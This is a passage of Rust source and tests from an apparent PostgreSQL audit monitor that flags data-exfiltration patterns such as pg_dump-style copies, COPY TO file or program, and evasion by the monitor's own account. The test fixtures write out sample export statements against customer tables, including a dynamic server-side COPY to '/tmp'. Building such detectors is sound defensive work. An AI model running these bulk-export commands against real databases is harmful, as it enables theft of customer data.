        StatementKind::Select | StatementKind::Table | StatementKind::Values => EventAction::Read,
        StatementKind::Copy => {
            if a.copy().is_some_and(|c| c.to) {
                EventAction::Read
            } else {
                EventAction::Write
            }
        }
        StatementKind::Insert
        | StatementKind::Update
        | StatementKind::Delete
        | StatementKind::Merge => EventAction::Write,
        StatementKind::Ddl => EventAction::Ddl,
        StatementKind::Dcl => EventAction::Dcl,
        _ => return None,
    };
    let (objects, named_any) = user_relations(&all, rule);
    let rw = matches!(action, EventAction::Read | EventAction::Write);
    if rw && objects.is_empty() && named_any {
        return None;
    }
    // COPY counts rows in pg_stat_statements too.
    let rows = Some(d.rows);
    let mut e = MaskedEvent::new(
        EventSource::PgStatStatements,
        action,
        EventPrincipal::account(d.user),
        from,
    )
    .with_rows(rows)
    .with_aggregate(d.calls, to);
    for o in &objects {
        e = e.with_object(object(d.database, o));
    }
    if rw && objects.is_empty() {
        e = e.with_object(unknown_object(d.database));
    }
    if action == EventAction::Read {
        for s in statement_signals(&all, rows, rule) {
            e = e.with_signal(s);
        }
        if !copied_to_client(&all, rule).is_empty()
            && copied
                .get(d.user)
                .is_some_and(|s| s.len() >= DUMP_MIN_RELATIONS)
        {
            e = e.with_signal(Signal::PgDump);
        }
    } else if d.rows > LARGE_ROWS {
        e = e.with_signal(Signal::LargeResult);
    }
    let kind = if objects.is_empty() && !named_any && d.own_text {
        OwnKind::Tableless
    } else if rw && objects.is_empty() {
        OwnKind::Unknown
    } else {
        OwnKind::Named
    };
    if own.routine(
        d.user,
        None,
        ClientSeen::NotVisible,
        &e,
        kind,
        Instant::now(),
    ) {
        return None;
    }
    Some(e)
}

/// Analysis of a `pg_stat_statements` text (`truncated`: the text reached
/// the read bound).
pub(crate) fn analyze_pss(text: &str, truncated: bool) -> QueryAnalysis {
    analyze(text, analyze_opts(truncated))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::audit::records::{Format, parse_record};

    #[allow(clippy::too_many_arguments)]
    fn rec(
        session: &str,
        stmt: u64,
        sub: u64,
        class: &str,
        command: &str,
        object: &str,
        text: &str,
        rows: Option<u64>,
        app: &str,
    ) -> AuditRecord {
        let rows = rows.map_or(String::new(), |r| format!(",{r}"));
        let text = text.replace('"', "\"\"");
        let line = serde_json::json!({
            "timestamp": "2026-09-28 21:45:31.320 UTC", "user": user_of(app), "dbname": "shop",
            "error_severity": "LOG",
            "remote_host": "192.0.2.14", "session_id": session, "application_name": app,
            "message": format!("AUDIT: SESSION,{stmt},{sub},{class},{command},{},{object},\"{text}\",<not logged>{rows}",
                if object.is_empty() { "" } else { "TABLE" }),
        });
        parse_record(Format::Jsonlog, line.to_string().as_bytes(), "LOG").unwrap()
    }

    /// Records of the application `databastion-agent*` come from the
    /// agent's account `databastion`; others from `backup`.
    fn user_of(app: &str) -> &'static str {
        if app.starts_with("databastion-agent") || app == "stolen" {
            "databastion"
        } else {
            "backup"
        }
    }

    /// `shop` with `pg_stat_statements` in `public`.
    fn shop_catalogs(log_catalog: Option<bool>) -> Catalogs {
        let mut c = Catalogs::default();
        c.insert(
            "shop",
            DbCatalog {
                pss_schema: Some("public".to_owned()),
                pgaudit_log_catalog: log_catalog,
            },
        );
        c
    }
    use databastion_core::audit::own::SharedOwnUsage;

    fn own_shared(
        addr: Option<ClientAddr>,
        budget: u64,
        usage: SharedOwnUsage,
        statements: SharedOwnStatements,
    ) -> PgOwn {
        PgOwn::new(
            OwnAccount::new(
                "databastion",
                Some(crate::conn::APPLICATION_NAME),
                addr,
                budget,
                usage,
            ),
            statements,
        )
    }

    fn own_with(addr: Option<ClientAddr>, budget: u64, usage: SharedOwnUsage) -> PgOwn {
        own_shared(addr, budget, usage, SharedOwnStatements::default())
    }

    fn own() -> PgOwn {
        own_with(
            ClientAddr::parse("192.0.2.14"),
            1000,
            SharedOwnUsage::default(),
        )
    }

    fn json(e: &MaskedEvent) -> String {
        format!(
            "{:?} {:?} {:?} {:?}",
            e.action(),
            e.objects()
                .iter()
                .map(|o| format!(
                    "{}.{}.{}",
                    o.database().as_str(),
                    o.schema().map_or("", |s| s.as_str()),
                    o.object().as_str()
                ))
                .collect::<Vec<_>>(),
            e.rows(),
            e.signals().iter().map(|s| s.as_str()).collect::<Vec<_>>()
        )
    }

    #[test]
    fn pg_dump_copies_raise_signature_and_shape() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "s1",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "SELECT c.oid FROM pg_catalog.pg_class c",
                Some(1),
                "pg_dump",
            ),
            rec(
                "s1",
                2,
                1,
                "READ",
                "COPY",
                "",
                "COPY crm.customers (id, email) TO stdout;",
                Some(0),
                "pg_dump",
            ),
            rec(
                "s1",
                3,
                1,
                "READ",
                "COPY",
                "",
                "COPY billing.invoices (id) TO stdout;",
                Some(0),
                "pg_dump",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        assert_eq!(events.len(), 2, "catalog-only statement skipped");
        let e = json(&events[0]);
        assert!(e.contains("shop.crm.customers"), "{e}");
        assert!(
            e.contains("signature.pg_dump") && e.contains("shape.full_table_copy"),
            "{e}"
        );
        assert_eq!(events[0].rows(), None, "utility COPY rows are unknown");
        assert_eq!(events[0].principal().application(), Some("pg_dump"));
    }

    #[test]
    fn dump_pattern_without_the_application_name() {
        let mut b = PgauditEvents::new(own());
        let recs: Vec<_> = ["a", "b", "c", "d"]
            .iter()
            .enumerate()
            .map(|(i, t)| {
                rec(
                    "s2",
                    i as u64 + 1,
                    1,
                    "READ",
                    "COPY",
                    "",
                    &format!("copy crm.{t} to stdout"),
                    Some(0),
                    "psql",
                )
            })
            .collect();
        let events = b.convert(recs, SystemTime::now());
        let dump: Vec<bool> = events
            .iter()
            .map(|e| e.signals().contains(&Signal::PgDump))
            .collect();
        assert_eq!(dump, [false, false, true, true]);
    }

    #[test]
    fn session_and_object_records_merge_and_rows_are_kept() {
        let mut b = PgauditEvents::new(own());
        let text = "select * from crm.customers";
        let mut object = rec(
            "s3",
            1,
            1,
            "READ",
            "SELECT",
            "crm.customers",
            text,
            Some(20000),
            "psql",
        );
        object.audit.object_audit = true;
        let session = rec(
            "s3",
            1,
            1,
            "READ",
            "SELECT",
            "crm.customers",
            text,
            Some(20000),
            "psql",
        );
        let events = b.convert(vec![object, session], SystemTime::now());
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].rows(), Some(20000));
        let e = json(&events[0]);
        assert!(
            e.contains("shape.full_table_read") && e.contains("volume.large_result"),
            "{e}"
        );
        assert!(!e.contains("pg_dump"));
    }

    #[test]
    fn copy_to_file_and_program_and_filtered_reads() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "s4",
                1,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "copy (select id from crm.customers) to '/tmp/x.csv'",
                Some(150),
                "psql",
            ),
            rec(
                "s4",
                1,
                2,
                "READ",
                "COPY",
                "",
                "copy (select id from crm.customers) to '/tmp/x.csv'",
                Some(0),
                "psql",
            ),
            rec(
                "s4",
                2,
                1,
                "READ",
                "COPY",
                "",
                "copy crm.customers to program 'gzip'",
                Some(0),
                "psql",
            ),
            rec(
                "s4",
                3,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "select * from crm.customers where id = 42",
                Some(1),
                "psql",
            ),
            rec(
                "s4",
                4,
                1,
                "WRITE",
                "INSERT",
                "crm.notes",
                "insert into crm.notes select * from crm.customers",
                Some(3),
                "psql",
            ),
            rec(
                "s4",
                4,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "insert into crm.notes select * from crm.customers",
                Some(3),
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(all.len(), 5, "{all:?}");
        assert!(
            all[0].contains("signature.copy_to_file") && all[0].contains("shape.full_table_copy"),
            "{}",
            all[0]
        );
        assert_eq!(events[0].rows(), Some(150));
        assert!(all[1].contains("signature.copy_to_program"), "{}", all[1]);
        assert!(!all[2].contains("shape."), "{}", all[2]);
        assert!(
            all[3].starts_with("Read") && all[3].contains("crm.customers"),
            "{}",
            all[3]
        );
        assert!(
            all[4].starts_with("Write") && all[4].contains("crm.notes"),
            "{}",
            all[4]
        );
    }

    #[test]
    fn own_writes_ddl_and_dcl_are_always_reported() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "b1",
                1,
                1,
                "WRITE",
                "UPDATE",
                "crm.t",
                "UPDATE crm.t SET a = $1 WHERE id = $2",
                Some(1),
                "databastion-agent",
            ),
            rec(
                "b1",
                2,
                1,
                "DDL",
                "ALTER TABLE",
                "crm.t",
                "ALTER TABLE crm.t ADD COLUMN b int",
                None,
                "databastion-agent",
            ),
            rec(
                "b1",
                3,
                1,
                "ROLE",
                "GRANT",
                "",
                "GRANT SELECT ON crm.t TO x",
                None,
                "databastion-agent",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 3, "{all:?}");
    }

    #[test]
    fn own_account_is_reported_unless_routine() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            // The agent's Discovery sample: skipped.
            rec(
                "a1",
                1,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                Some(1000),
                "databastion-agent",
            ),
            // Same account, whole-table read: reported even under the agent's name.
            rec(
                "a1",
                2,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "select * from crm.t",
                Some(5),
                "databastion-agent",
            ),
            // Same account from another application: reported.
            rec(
                "a2",
                1,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "select a from crm.t where id = 1",
                Some(1),
                "stolen",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 2, "{all:?}");
        assert!(all[0].contains("shape.full_table_read"), "{all:?}");
        assert_eq!(events[1].principal().application(), Some("stolen"));
        // pg_stat_statements: the agent's account only with a signal.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let dump = analyze_pss("select * from crm.t", false);
        let deltas = [
            StatementDelta {
                own_text: false,
                user: "databastion",
                database: "shop",
                analysis: &routine,
                calls: 1,
                rows: 1000,
            },
            StatementDelta {
                own_text: false,
                user: "databastion",
                database: "shop",
                analysis: &dump,
                calls: 1,
                rows: 5,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(ev[0].signals().contains(&Signal::FullTableRead));
    }

    #[test]
    fn own_account_paging_and_other_addresses_are_reported() {
        let page = |i: u64| {
            rec(
                "p1",
                i,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                Some(600),
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own());
        // 600 rows: within Discovery's budget (1000); 1200: beyond.
        assert!(b.convert(vec![page(1)], SystemTime::now()).is_empty());
        assert_eq!(b.convert(vec![page(2)], SystemTime::now()).len(), 1);
        // Another client address than the agent's.
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("198.51.100.7"),
            1000,
            SharedOwnUsage::default(),
        ));
        assert_eq!(b.convert(vec![page(1)], SystemTime::now()).len(), 1);
        // The agent's address could not be read: nothing is left out.
        let mut b = PgauditEvents::new(own_with(None, 1000, SharedOwnUsage::default()));
        assert_eq!(b.convert(vec![page(1)], SystemTime::now()).len(), 1);
        // Unknown rows (pgaudit.log_rows off) are charged the whole budget:
        // the second statement on the same object is reported.
        let unknown = |i: u64| {
            rec(
                "p2",
                i,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                None,
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own());
        assert!(b.convert(vec![unknown(1)], SystemTime::now()).is_empty());
        assert_eq!(b.convert(vec![unknown(2)], SystemTime::now()).len(), 1);
        // pg_stat_statements: rows per object within the poll.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let deltas = [StatementDelta {
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls: 3,
            rows: 3000,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert_eq!(
            pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0).len(),
            1
        );
    }

    #[test]
    fn own_budget_survives_stream_restarts_and_source_switches() {
        let shared = SharedOwnUsage::default();
        let own_on = |u: &SharedOwnUsage| {
            own_with(
                ClientAddr::parse("192.0.2.14"),
                1000,
                std::sync::Arc::clone(u),
            )
        };
        let page = rec(
            "r1",
            1,
            1,
            "READ",
            "SELECT",
            "crm.t",
            "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
            Some(600),
            "databastion-agent",
        );
        // First pgaudit stream: within the budget.
        let mut b = PgauditEvents::new(own_on(&shared));
        assert!(b.convert(vec![page], SystemTime::now()).is_empty());
        drop(b);
        // The stream restarts on pg_stat_statements (source switch): the
        // same object is still charged, and the next read is reported.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let deltas = [StatementDelta {
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls: 1,
            rows: 600,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert_eq!(
            pss_events(&deltas, &mut own_on(&shared), &Catalogs::default(), t0, t0).len(),
            1
        );
        // A fresh usage (what a per-stream counter did) would have skipped it.
        assert!(
            pss_events(
                &deltas,
                &mut own_on(&SharedOwnUsage::default()),
                &Catalogs::default(),
                t0,
                t0
            )
            .is_empty()
        );
    }

    /// A read of the agent's identity that returns no row is charged one
    /// row (security review of #196, Low), on pgaudit (with
    /// `pgaudit.log_rows`) per statement, and on `pg_stat_statements` per
    /// call of a delta: a walk of 0-row reads is left out for at most the
    /// per-object budget of statements, then reported.
    #[test]
    fn own_zero_row_reads_are_charged_one_row_each() {
        let walk = |n: u64| {
            rec(
                "w1",
                n,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT 1 FROM crm.t WHERE id = $1 AND email = $2",
                Some(0),
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("192.0.2.14"),
            3,
            SharedOwnUsage::default(),
        ));
        let reported: Vec<usize> = (1..=5)
            .map(|n| b.convert(vec![walk(n)], SystemTime::now()).len())
            .collect();
        assert_eq!(reported, [0, 0, 0, 1, 1]);
        // pg_stat_statements: one delta of 3 calls uses up a budget of 3,
        // one of 4 calls is over it.
        let routine = analyze_pss("SELECT 1 FROM crm.t WHERE id = $1 AND email = $2", false);
        let delta = |calls| StatementDelta {
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls,
            rows: 0,
        };
        let t0 = SystemTime::UNIX_EPOCH;
        let own3 = || {
            own_with(
                ClientAddr::parse("192.0.2.14"),
                3,
                SharedOwnUsage::default(),
            )
        };
        let mut own = own3();
        let cats = Catalogs::default();
        assert!(pss_events(&[delta(3)], &mut own, &cats, t0, t0).is_empty());
        assert_eq!(pss_events(&[delta(1)], &mut own, &cats, t0, t0).len(), 1);
        assert_eq!(pss_events(&[delta(4)], &mut own3(), &cats, t0, t0).len(), 1);
    }

    /// Quoted identifiers that differ only in case share one budget
    /// (security review of #197, M2): fails closed, `"T"` and `t` are
    /// charged together.
    #[test]
    fn own_budget_ignores_the_case_of_names() {
        let read = |n: u64, object: &str, text: &str| {
            rec(
                "c1",
                n,
                1,
                "READ",
                "SELECT",
                object,
                text,
                Some(0),
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("192.0.2.14"),
            2,
            SharedOwnUsage::default(),
        ));
        let reported: Vec<usize> = [
            read(1, "crm.t", "SELECT 1 FROM crm.t WHERE id = $1"),
            read(2, "crm.T", "SELECT 1 FROM crm.\"T\" WHERE id = $1"),
            read(3, "CRM.t", "SELECT 1 FROM \"CRM\".t WHERE id = $1"),
        ]
        .into_iter()
        .map(|r| b.convert(vec![r], SystemTime::now()).len())
        .collect();
        assert_eq!(reported, [0, 0, 1]);
    }

    /// The per-transaction statements of one Discovery scan (about 90
    /// transactions) and the check / stream probes, as the agent sends
    /// them.
    fn own_tableless_records(app: &str, n: u64) -> Vec<AuditRecord> {
        let mut out = vec![rec(
            "own1",
            1,
            1,
            "READ",
            "SELECT",
            "",
            sql::SESSION_SETUP,
            Some(1),
            app,
        )];
        for i in 0..n {
            out.push(rec(
                "own1",
                2 + i,
                1,
                "READ",
                "SELECT",
                "",
                sql::SET_LOCAL_TIMEOUTS,
                Some(1),
                app,
            ));
        }
        out.push(rec(
            "own1",
            2 + n,
            1,
            "READ",
            "SELECT",
            "",
            sql::OWN_CLIENT_ADDR,
            Some(1),
            app,
        ));
        out
    }

    fn charged_keys(u: &SharedOwnUsage) -> Vec<String> {
        u.lock().unwrap().budgeted_objects()
    }

    #[test]
    fn own_tableless_statements_are_skipped_and_not_charged() {
        let usage = SharedOwnUsage::default();
        // A small budget: one charge of the old rule would exceed it.
        let acct = own_with(
            ClientAddr::parse("192.0.2.14"),
            10,
            std::sync::Arc::clone(&usage),
        );
        let mut b = PgauditEvents::new(acct);
        // pgaudit.log_rows off: unknown rows, charged the whole budget
        // under the row rule.
        let mut recs = own_tableless_records("databastion-agent", 5);
        for r in &mut recs {
            r.audit.rows = None;
        }
        recs.extend(own_tableless_records("databastion-agent", 5));
        let events = b.convert(recs, SystemTime::now());
        assert!(
            events.is_empty(),
            "{:?}",
            events.iter().map(json).collect::<Vec<_>>()
        );
        assert!(
            charged_keys(&usage).is_empty(),
            "{:?}",
            charged_keys(&usage)
        );
        // The same statements from the agent's account under another
        // application, and from another role: reported against `*`.
        for app in ["stolen", "psql"] {
            let mut b = PgauditEvents::new(own());
            let events = b.convert(own_tableless_records(app, 2), SystemTime::now());
            assert_eq!(events.len(), 4, "{app}");
            assert!(events.iter().all(|e| json(e).contains("shop..*")), "{app}");
        }
        // The agent's application and account from another address.
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("198.51.100.7"),
            1000,
            SharedOwnUsage::default(),
        ));
        let events = b.convert(
            own_tableless_records("databastion-agent", 1),
            SystemTime::now(),
        );
        assert_eq!(events.len(), 3);
    }

    #[test]
    fn own_account_other_tableless_statements_are_reported() {
        let usage = SharedOwnUsage::default();
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
        ));
        let texts = [
            // A user-defined function: the connector never calls one.
            "select crm.f()",
            "SELECT crm.f($1)",
            // pg_catalog functions that read relations or run SQL.
            "SELECT pg_catalog.query_to_xml($1, true, false, '')",
            "select pg_catalog.lo_get(16400)",
            // An own statement with something appended or changed.
            &format!("{} , crm.f()", sql::OWN_CLIENT_ADDR),
            "SELECT pg_catalog.set_config('statement_timeout', $1, true)",
            &sql::SET_LOCAL_TIMEOUTS.to_lowercase(),
            // Another setting read, or the own statement with constants
            // instead of its bound parameters: exact text only.
            &sql::SESSION_SETUP.replace("server_version_num", "crm.secret"),
            &sql::SET_LOCAL_TIMEOUTS.replace("$1", "'1s'"),
            // Several statements.
            &format!("{}; select crm.f()", sql::OWN_CLIENT_ADDR),
        ];
        for (i, t) in texts.iter().enumerate() {
            let r = rec(
                "f1",
                i as u64 + 1,
                1,
                "READ",
                "SELECT",
                "",
                t,
                Some(1),
                "databastion-agent",
            );
            let events = b.convert(vec![r], SystemTime::now());
            assert_eq!(events.len(), 1, "{t}");
            assert!(json(&events[0]).contains("shop..*"), "{t}");
        }
        assert!(charged_keys(&usage).is_empty(), "`*` is never budgeted");
        // One record of the statement is an own text, another is not: the
        // event is not an own statement.
        let recs = vec![
            rec(
                "f2",
                1,
                1,
                "READ",
                "SELECT",
                "",
                sql::OWN_CLIENT_ADDR,
                Some(1),
                "databastion-agent",
            ),
            rec(
                "f2",
                1,
                2,
                "READ",
                "SELECT",
                "",
                "select crm.f()",
                Some(1),
                "databastion-agent",
            ),
        ];
        assert_eq!(b.convert(recs, SystemTime::now()).len(), 1);
    }

    #[test]
    fn own_reads_of_a_masked_name_stay_budgeted() {
        // A value-like relation name normalizes to `*`: still a named
        // relation, budgeted like any other (not the unknown object).
        let text = "SELECT \"a\" FROM ONLY \"crm\".\"export_client_0639988384\" LIMIT $1";
        let r = rec(
            "v1",
            1,
            1,
            "READ",
            "SELECT",
            "crm.export_client_0639988384",
            text,
            Some(10),
            "databastion-agent",
        );
        let mut b = PgauditEvents::new(own());
        assert!(b.convert(vec![r], SystemTime::now()).is_empty());
        let a = analyze_pss(text, false);
        let deltas = [StatementDelta {
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &a,
            calls: 1,
            rows: 10,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert!(pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0).is_empty());
    }

    #[test]
    fn own_tableless_statements_with_a_signal_are_reported() {
        let mut b = PgauditEvents::new(own());
        let r = rec(
            "g1",
            1,
            1,
            "READ",
            "SELECT",
            "",
            sql::SET_LOCAL_TIMEOUTS,
            Some(LARGE_ROWS + 1),
            "databastion-agent",
        );
        let events = b.convert(vec![r], SystemTime::now());
        assert_eq!(events.len(), 1);
        assert!(events[0].signals().contains(&Signal::LargeResult));
        // pg_stat_statements: rows summed over the poll.
        let a = analyze_pss(PSS_SET_LOCAL, false);
        let deltas = [StatementDelta {
            own_text: true,
            user: "databastion",
            database: "shop",
            analysis: &a,
            calls: LARGE_ROWS + 1,
            rows: LARGE_ROWS + 1,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(ev[0].signals().contains(&Signal::LargeResult));
    }

    /// `SET_LOCAL_TIMEOUTS` as `pg_stat_statements` stores it (constants,
    /// booleans included, replaced by parameters numbered after the bound
    /// ones; checked on PostgreSQL 16).
    const PSS_SET_LOCAL: &str = "SELECT pg_catalog.set_config($4, $1, $5), \
        pg_catalog.set_config($6, $2, $7), pg_catalog.set_config($8, $3, $9), \
        pg_catalog.current_setting($10)";

    #[test]
    fn pss_form_of_the_own_statements() {
        assert_eq!(
            pss_form(sql::SET_LOCAL_TIMEOUTS).as_deref(),
            Some(PSS_SET_LOCAL)
        );
        assert_eq!(
            pss_form(sql::SESSION_SETUP).as_deref(),
            Some(
                "SELECT pg_catalog.set_config($4, $5, $6), \
                 pg_catalog.set_config($7, $8, $9), \
                 pg_catalog.set_config($10, $1, $11), \
                 pg_catalog.set_config($12, $2, $13), \
                 pg_catalog.set_config($14, $3, $15), \
                 pg_catalog.current_setting($16)"
            )
        );
        assert_eq!(
            pss_form(sql::OWN_CLIENT_ADDR).as_deref(),
            Some(sql::OWN_CLIENT_ADDR)
        );
        let texts = pss_form(&sql::pss_texts("public", true).unwrap()).unwrap();
        // Numbered in order of appearance, as PostgreSQL does.
        assert!(texts.contains("left(s.query, $2)"), "{texts}");
        assert!(texts.contains(">= $3"), "{texts}");
        assert!(texts.contains("pg_stat_statements($4)"), "{texts}");
        assert!(texts.ends_with("LIMIT $5"), "{texts}");
        assert!(texts.contains("ANY($1)"), "{texts}");
        let texts = pss_form(&sql::pss_texts("public", false).unwrap()).unwrap();
        assert!(texts.contains("s.queryid, $2, pg_catalog"), "{texts}");
        // Quoted identifiers and doubled quotes.
        assert_eq!(
            pss_form("SELECT \"a\"\"b\" FROM t WHERE x = 'it''s' AND y = $1").as_deref(),
            Some("SELECT \"a\"\"b\" FROM t WHERE x = $2 AND y = $1")
        );
        // What the connector never sends: no form, never matched.
        for t in [
            "SELECT 1 -- c",
            "SELECT /* c */ 1",
            "SELECT E'a'",
            "SELECT 1.5",
            "SELECT $$a$$",
            "SELECT 'a",
            "SELECT é",
        ] {
            assert_eq!(pss_form(t), None, "{t}");
        }
    }

    #[test]
    fn own_tableless_statements_in_pg_stat_statements() {
        let setup = pss_form(sql::SESSION_SETUP).unwrap();
        let texts_sql = sql::pss_texts("public", true).unwrap();
        let texts = pss_form(&texts_sql).unwrap();
        let own_account = own;
        let usage = SharedOwnUsage::default();
        let mut own = own_with(
            ClientAddr::parse("192.0.2.14"),
            10,
            std::sync::Arc::clone(&usage),
        );
        own.allow_statement(&texts_sql);
        for t in [PSS_SET_LOCAL, &setup, sql::OWN_CLIENT_ADDR, &texts] {
            assert!(own.own_pss_text(t), "{t}");
        }
        // Sent with constants instead of the connector's bound
        // parameters (another queryid), another setting read, another
        // spelling, the text as sent: not an own statement (#76 review I2).
        let literals = "SELECT pg_catalog.set_config($1, $2, $3), \
            pg_catalog.set_config($4, $5, $6), pg_catalog.set_config($7, $8, $9), \
            pg_catalog.current_setting($10)";
        let lowered = PSS_SET_LOCAL.to_lowercase();
        let reordered = "SELECT pg_catalog.set_config($4, $1, $5), \
            pg_catalog.set_config($6, $2, $7), pg_catalog.set_config($8, $3, $9), \
            pg_catalog.current_setting($1)";
        for t in [
            literals,
            &lowered,
            reordered,
            sql::SET_LOCAL_TIMEOUTS,
            "select crm.f($1)",
        ] {
            assert!(!own.own_pss_text(t), "{t}");
        }
        let analyzed = |t: &str| (analyze_pss(t, false), own.own_pss_text(t));
        let set_local = analyzed(PSS_SET_LOCAL);
        let setup = analyzed(&setup);
        let addr = analyzed(sql::OWN_CLIENT_ADDR);
        let texts = analyzed(&texts);
        let literals = analyzed(literals);
        let other = analyzed("select crm.f($1)");
        // A cut text is never an own statement (the poller checks `cut`).
        let cut = (analyze_pss(sql::OWN_CLIENT_ADDR, true), false);
        fn delta<'a>(user: &'a str, a: &'a (QueryAnalysis, bool)) -> StatementDelta<'a> {
            StatementDelta {
                user,
                database: "shop",
                analysis: &a.0,
                own_text: a.1,
                calls: 90,
                rows: 90,
            }
        }
        let t0 = SystemTime::UNIX_EPOCH;
        // Two polls' worth of a scan: nothing reported, nothing charged.
        for _ in 0..2 {
            let deltas = [
                delta("databastion", &set_local),
                delta("databastion", &setup),
                delta("databastion", &addr),
                delta("databastion", &texts),
            ];
            let ev = pss_events(&deltas, &mut own, &Catalogs::default(), t0, t0);
            assert!(
                ev.is_empty(),
                "{:?}",
                ev.iter().map(json).collect::<Vec<_>>()
            );
        }
        assert!(charged_keys(&usage).is_empty());
        // Another role, a cut text, another function, the own statement
        // with constants instead of parameters: reported on `*`.
        let deltas = [
            delta("app", &set_local),
            delta("app", &texts),
            delta("databastion", &cut),
            delta("databastion", &other),
            delta("databastion", &literals),
        ];
        let ev = pss_events(&deltas, &mut own, &Catalogs::default(), t0, t0);
        assert_eq!(ev.len(), 5);
        assert!(ev.iter().all(|e| json(e).contains("shop..*")));
        assert!(charged_keys(&usage).is_empty(), "`*` is never budgeted");
        // Without the stream's registration, the text query is not one of
        // the agent's statements.
        let fresh = own_account();
        assert!(!fresh.own_pss_text(&pss_form(&texts_sql).unwrap()));
    }

    #[test]
    fn a_discovery_scan_leaves_no_own_event_and_no_wildcard_charge() {
        // Every statement the connector sends, as pgaudit logs it
        // (`pgaudit.log_rows` on, `log_relation` off), with about 90
        // transactions of `set_config` calls; the sampling statements
        // within the budget. The `pg_stat_statements` text queries were
        // registered by an earlier `pg_stat_statements` stream of the
        // target (source switch: the pgaudit stream reads the records of
        // that period).
        let usage = SharedOwnUsage::default();
        let statements = SharedOwnStatements::default();
        let mut pss = own_shared(
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
            std::sync::Arc::clone(&statements),
        );
        pss.allow_statement(&sql::pss_texts("public", true).unwrap());
        pss.allow_statement(&sql::pss_texts("public", false).unwrap());
        drop(pss);
        let mut b = PgauditEvents::new(own_shared(
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
            statements,
        ));
        b.set_catalogs(shop_catalogs(Some(false)));
        let mut recs = own_tableless_records("databastion-agent", 90);
        for (i, text) in sql::all_statements().iter().enumerate() {
            // Transaction control is logged in the MISC class.
            let (class, command) = match text.split(' ').next() {
                Some("BEGIN") => ("MISC", "BEGIN"),
                Some("COMMIT") => ("MISC", "COMMIT"),
                Some("ROLLBACK") => ("MISC", "ROLLBACK"),
                _ => ("READ", "SELECT"),
            };
            recs.push(rec(
                "scan",
                i as u64 + 1,
                1,
                class,
                command,
                "",
                text,
                Some(100),
                "databastion-agent",
            ));
        }
        let events = b.convert(recs, SystemTime::now());
        assert!(
            events.is_empty(),
            "{:?}",
            events.iter().map(json).collect::<Vec<_>>()
        );
        let keys = charged_keys(&usage);
        assert!(!keys.iter().any(|k| k.ends_with("\u{0}*")), "{keys:?}");
        // Only the sampled relation (`s.t`) is budgeted.
        assert_eq!(keys, ["shop\u{0}s\u{0}t"], "{keys:?}");
    }

    #[test]
    fn copy_records_not_settled_by_their_text_are_server_side_exports() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "x1",
            1,
            2,
            "READ",
            "COPY",
            "",
            "DO $$ BEGIN EXECUTE format('COPY %I.%I TO %L', 'crm', 'customers', '/tmp/x'); END $$",
            Some(0),
            "psql",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert_eq!(events.len(), 1);
        assert!(
            events[0].signals().contains(&Signal::CopyToFile),
            "{}",
            json(&events[0])
        );
        // A client COPY whose text shows it: no server-side signal.
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "x2",
            1,
            1,
            "READ",
            "COPY",
            "",
            "copy crm.t to stdout",
            Some(0),
